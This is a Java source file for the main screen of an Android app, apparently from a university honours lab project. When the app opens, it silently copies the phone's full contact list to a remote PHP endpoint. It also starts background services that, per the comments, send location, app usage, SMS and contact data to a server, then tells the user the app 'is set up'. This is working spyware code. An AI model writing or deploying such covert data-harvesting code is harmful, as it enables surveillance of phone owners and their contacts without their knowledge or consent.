package uk.ac.rgu.lab04.honours;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;


public class MainActivity extends AppCompatActivity {

    private TextView msgDisplayed = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        msgDisplayed = findViewById(R.id.destroyApp);
        //add full contact list to server at installation
        getPhoneNumbers();

        //service sending location to server
        startLocationService();

        //service sending app usage stats
        startUsageStats();

        //service for sms
        startSMSService();

        //service for contact
        startContactService();


        msgDisplayed.setText("The app is set up, You can close it !");

    }

    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    @Override
    public void onBackPressed() {
        finishAffinity();
    }


    /***************************
    **                        **
    **  SMS OBSERVER SERVICE  **
    **                        **
    ***************************/
    private void startSMSService() {
        if (!isMyServiceRunning(ListenSmsMmsService.class)) {
            Intent intent = new Intent(this, ListenSmsMmsService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            }
        }
    }

    /***************************
    **                        **
    **  USAGE STATS SERVICE   **
    **                        **
    ***************************/
    private void startUsageStats() {
        Intent intent = new Intent(this, UsageStatService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
    }


    /***************************
    **                        **
    **    LOCATION SERVICE    **
    **                        **
    ***************************/
    public void startLocationService(){
       Intent intent = new Intent(this, LocationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
    }

    /***************************
    **                        **
    **    CONTACT SERVICE     **
    **                        **
    ***************************/
    public void startContactService(){
        Intent intent = new Intent(this, ContactsService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
    }

    /***************************
    **                        **
    **   FETCH CONTACT LIST   **
    **                        **
    ***************************/
    private void getPhoneNumbers() {

        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        // Loop Through All The Numbers
        while (phones.moveToNext()) {

            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            // Cleanup the phone number
            phoneNumber = phoneNumber.replaceAll("[()\\s-]+", "");

            // Enter Into Hash Map
            if (phoneNumber.startsWith("+")){
                phoneNumber="0"+phoneNumber.substring(3);
            }
            insertData(Constants.getPrivateKey(this),phoneNumber, name);
        }

        phones.close();
    }


    //send contact to server
    public static void insertData(final String key, final String phone, final String name){

        class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
            @Override
            protected void onPreExecute() {
                super.onPreExecute();
            }

            @Override
            protected String doInBackground(String... params) {
                String reg_url=Constants.URL_SERVER+"insert/insertContact.php";
                String key=params[0];
                String phone=params[1];
                String name=params[2];
                try {
                    URL url = new URL(reg_url);
                    HttpURLConnection httpURLConnection =
                            (HttpURLConnection)url.openConnection();
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setDoOutput(true);
                    OutputStream OS = httpURLConnection.getOutputStream();
                    BufferedWriter bufferedWriter = new BufferedWriter(new
                            OutputStreamWriter(OS, StandardCharsets.UTF_8));
                    String data= URLEncoder.encode("key","UTF-8")+"="+URLEncoder.encode(key,"UTF-8")
                            +"&"+URLEncoder.encode("phone","UTF-8")+"="+URLEncoder.encode(phone,"UTF-8")
                            +"&"+URLEncoder.encode("name","UTF-8")+"="+URLEncoder.encode(name,"UTF-8");
                    bufferedWriter.write(data);
                    bufferedWriter.flush();
                    bufferedWriter.close();
                    OS.close();
                    InputStream IS = httpURLConnection.getInputStream();
                    IS.close();
                    return "Registration Success!!";
                } catch (IOException e){
                    e.printStackTrace();
                }
                return null;
            }

            @Override
            protected void onProgressUpdate(Void... values) {
                super.onProgressUpdate(values);
            }
        }

        SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();

        sendPostReqAsyncTask.execute(key,phone,name);
    }
}
